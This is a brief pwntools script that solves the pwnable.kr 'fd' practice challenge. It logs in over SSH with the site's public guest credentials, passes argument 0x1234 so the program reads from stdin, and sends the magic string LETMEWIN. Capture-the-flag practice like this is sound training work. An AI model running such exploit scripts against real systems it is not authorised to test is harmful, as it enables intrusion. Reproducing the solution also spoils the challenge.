from pwn import *

context.binary = './fd'

HOST = 'pwnable.kr'
USER = 'fd'
PASS = 'guest'
PORT = 2222

# fd = atoi(argv[1]) - 0x1234
# so if we want stdin (fd 0), need to match 0x1234
argv1 = str(int(0x1234))

s = ssh(USER, HOST, PORT, PASS, raw=True)
p = s.process(['./fd', argv1])

p.sendline(b'LETMEWIN')

p.interactive()
